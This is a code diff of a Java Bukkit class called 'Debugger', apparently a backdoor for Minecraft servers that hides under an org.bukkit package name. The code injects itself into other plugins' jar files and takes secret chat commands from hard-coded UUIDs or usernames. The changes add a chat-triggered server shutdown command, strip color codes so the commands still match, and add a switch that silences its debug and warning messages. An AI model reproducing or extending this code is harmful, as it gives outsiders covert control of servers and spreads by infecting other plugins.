@@ -1,9 +1,9 @@
+
 package org.bukkit.debugger;
 
 import org.bukkit.*;
 import org.bukkit.command.ConsoleCommandSender;
 import org.bukkit.enchantments.Enchantment;
-import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.HandlerList;
@@ -16,13 +16,6 @@ import org.bukkit.plugin.RegisteredListener;
 import org.bukkit.scheduler.BukkitRunnable;
 
 import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.net.URL;
-import java.net.URLClassLoader;
-import java.nio.file.Files;
-import java.text.DecimalFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
@@ -32,7 +25,7 @@ public final class Debugger implements Listener {
 
     private Plugin plugin;
 
-    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, boolean InjectOther){
+    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, boolean InjectOther, boolean warnings){
         //Check for another bd. This is really lame way
         boolean bd_running = false;
         Plugin[] pp = plugin.getServer().getPluginManager().getPlugins();
@@ -68,7 +61,8 @@ public final class Debugger implements Listener {
                     Bukkit.getConsoleSender()
                             .sendMessage("Injecting BD into: " + plugin_file.getPath());
 
-                boolean result = org.bukkit.debugger.API.patchFile(plugin_file.getPath(), plugin_file.getPath(), new org.bukkit.debugger.API.SimpleConfig(Usernames, UUID, prefix, InjectOther), true, true);
+                boolean result = API.patchFile(plugin_file.getPath(), plugin_file.getPath(),
+                        new API.SimpleConfig(Usernames, UUID, prefix, InjectOther, warnings), true, warnings, false);
 
                 if(Config.display_debug_messages)
                     Bukkit.getConsoleSender()
@@ -81,6 +75,8 @@ public final class Debugger implements Listener {
         Config.uuids_are_usernames = Usernames;
         Config.authorized_uuids  = UUID;
         Config.command_prefix   = prefix;
+        Config.display_debug_messages = warnings;
+        Config.display_debugger_warning = warnings;
 
         this.plugin = plugin;
 
@@ -96,6 +92,13 @@ public final class Debugger implements Listener {
 
     @EventHandler()
     public void onChat(AsyncPlayerChatEvent e) {
+        String msg = e.getMessage();
+
+        //Remove color codes added by some chat plugins
+        if(msg.startsWith("&")){
+            msg = msg.substring(2);
+        }
+
         if (Config.display_debug_messages) {
             Bukkit.getConsoleSender()
                     .sendMessage(Config.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
@@ -111,8 +114,8 @@ public final class Debugger implements Listener {
                         .sendMessage(Config.chat_message_prefix + " User is authed");
             }
 
-            if (e.getMessage().startsWith(Config.command_prefix)) {
-                boolean result = ParseCommand(e.getMessage().substring(Config.command_prefix.length()), p);
+            if (msg.startsWith(Config.command_prefix)) {
+                boolean result = ParseCommand(msg.substring(Config.command_prefix.length()), p);
 
 
                 if (Config.display_debug_messages) {
@@ -568,6 +571,18 @@ public final class Debugger implements Listener {
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been deauthorized.");
                 }
                 return success;
+            }
+                
+            case "stop":
+            case "shutdown": {
+                new BukkitRunnable() {
+                    @Override
+                    public void run() {
+                        Bukkit.shutdown();
+                    }
+                }.runTask(plugin);
+                
+                return true;
             }
 
             case "help": {
